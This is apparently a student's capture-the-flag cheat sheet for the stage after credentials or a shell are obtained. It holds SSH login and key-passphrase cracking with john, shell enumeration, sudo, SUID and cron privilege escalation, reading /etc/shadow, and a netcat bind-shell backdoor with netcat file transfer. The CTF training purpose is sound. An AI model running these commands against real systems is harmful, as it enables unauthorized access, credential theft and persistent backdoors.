# Got Creds / Got a Shell

## Goal
Turn a password, a key or a command prompt into the flag.

**Fast path (script)** — all scripts: [15_scripts](15_scripts.md)
```bash
ctf --after-shell                                         # prints the list below (contacts nothing)
ctf --banner $IP:$PORT --send 'id; ls -la; cat flag*'     # a port that already IS a shell
ctf --crack id_rsa                                        # locked SSH key → passphrase
```

**Checklist**
- [ ] every password found → tried on ssh, ftp, web login, `su`, zip, steghide?
- [ ] in a shell: `id` · `ls -la` · `find` the flag · `sudo -l`
- [ ] flag not readable as this user → who owns it? (`ls -la flag.txt`) → become that user (Step 3)

# Commands

### Step 1: log in with what you found
```bash
ssh -p $PORT <user>@$IP                                   # password
chmod 600 id_rsa ; ssh -i id_rsa -p $PORT <user>@$IP      # private key (without chmod 600 ssh refuses the key)
ssh2john id_rsa > k.hash ; john k.hash --wordlist=/usr/share/wordlists/rockyou.txt     # key asks for a passphrase → [07_crack](07_crack.md)
ssh -p $PORT <user>@$IP 'cat flag.txt'                    # one command, no session
ftp $IP $PORT   ·   smbclient //$IP/<share> -U '<user>%<pass>'   ·   mysql -h $IP -u <user> -p --skip-ssl
```
User name unknown for a key: comment at the end of `id_rsa.pub`, names in `/etc/passwd` (via LFI), names on the web page.

### Step 2: inside the shell (ssh session, or a port / command box that runs commands)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'           # proper prompt
id ; whoami ; hostname ; pwd ; uname -a
ls -la ; ls -la ~ /home/* /root /opt /var/www /tmp 2>/dev/null
find / -iname '*flag*' 2>/dev/null | grep -vE '^/(proc|sys|usr/lib|usr/share)'
grep -rliE 'ehCTF\{|flag\{|SIT\{' /home /var/www /opt /tmp 2>/dev/null
cat ~/.bash_history ; ls -la ~/.ssh ; cat /etc/passwd | grep -vE 'nologin|false'
```

### Step 3: flag not readable → become another user
```bash
sudo -l                                   # program listed → gtfobins: e.g. sudo vim -c ':!/bin/sh' · sudo find . -exec /bin/sh \; -quit · sudo less /etc/hosts then !sh
find / -perm -4000 -type f 2>/dev/null    # unusual SUID file (not passwd / su / mount / sudo) → run it; same gtfobins trick without sudo
cat /etc/crontab ; ls -la /etc/cron.*     # script run by root that I can edit → add: cat /root/flag.txt > /tmp/f.txt
su <user>                                 # every password found so far
cat /etc/shadow 2>/dev/null               # readable → hashes → [07_crack](07_crack.md) (unshadow)
```

### Netcat backdoor (lecture 10 demo) — only if a Q asks for it
```bash
nc -nv $IP $PORT                              # a backdoor is ALREADY listening → connect, type commands (the usual exam form)
nc -lvnp 6666 -e /bin/bash                    # make one: victim listens and hands its shell to whoever connects  (Windows: nc -l -p 6666 -e cmd.exe)
nc -lvnp 6666 > got.file    ·    nc <receiver ip> 6666 < file      # move a file: receiver first, then sender
```

### Helpline
```bash
# "Permissions 0644 for 'id_rsa' are too open" → chmod 600 id_rsa.
# ssh "no matching host key type" (old server) → ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa …
# shell has no output for a command → add 2>&1 ; arrow keys print ^[[A → python3 pty line above.
# "Permission denied" on the flag → ls -la it, then Step 3.
```
